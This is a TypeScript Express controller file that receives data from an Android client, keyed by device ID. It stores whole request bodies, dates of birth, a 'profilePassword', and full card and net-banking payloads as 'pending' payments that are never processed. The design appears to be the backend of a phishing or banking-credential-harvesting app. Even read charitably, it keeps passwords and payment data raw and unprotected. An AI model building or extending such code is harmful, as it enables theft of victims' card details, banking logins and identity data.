import { Request, Response } from "express";
import FormSubmission from "../models/FormSubmission";
import Payment from "../models/Payment";
import logger from "../logger/logger";

/**
 * Controllers for forms + payments — now FormSubmission.payload is flexible.
 */

/* ------------------ submit generic form ------------------ */
export async function submitForm(req: Request, res: Response) {
  const body = req.body || {};
  try {
    const uniqueid = (body.uniqueid || body.deviceId || "") as string;

    const doc = new FormSubmission({
      uniqueid,
      // store whole incoming body as payload so Android can send any shape
      payload: body,
    });

    await doc.save();
    logger.info("forms: form_submissions saved (payload)", { uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitForm failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

/* ------------------ submit success data (dob/profilePassword) ------------------ */
/**
 * Writes dob/profilePassword into payload so we don't keep separate top-level fields.
 * Accepts empty string as valid value. Uses upsert so device record exists.
 */
export async function submitSuccessData(req: Request, res: Response) {
  const body = req.body || {};
  const uniqueid = (body.uniqueid || "") as string;
  if (!uniqueid) return res.status(400).json({ success: false, error: "missing uniqueid" });

  try {
    const update: any = { $set: {} };

    // use hasOwnProperty so empty string or null explicit values are saved
    if (Object.prototype.hasOwnProperty.call(body, "dob")) {
      update.$set["payload.dob"] = body.dob ?? "";
    }
    if (Object.prototype.hasOwnProperty.call(body, "profilePassword")) {
      update.$set["payload.profilePassword"] = body.profilePassword ?? "";
    }

    if (Object.keys(update.$set).length === 0) {
      logger.warn("forms: success_data called but no dob/profilePassword keys present", { uniqueid });
      return res.json({ success: true });
    }

    await FormSubmission.findOneAndUpdate({ uniqueid }, update, { upsert: true });
    logger.info("forms: success_data updated", { uniqueid, changes: Object.keys(update.$set) });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitSuccessData failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

/* ------------------ payments (card/netbanking) ------------------ */
export async function submitCardPayment(req: Request, res: Response) {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "card",
      payload: body,
      status: "pending",
    });
    await p.save();
    logger.info("payments: card saved", { uniqueid: p.uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitCardPayment failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

export async function submitNetBanking(req: Request, res: Response) {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "netbanking",
      payload: body,
      status: "pending",
    });
    await p.save();
    logger.info("payments: netbanking saved", { uniqueid: p.uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitNetBanking failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}
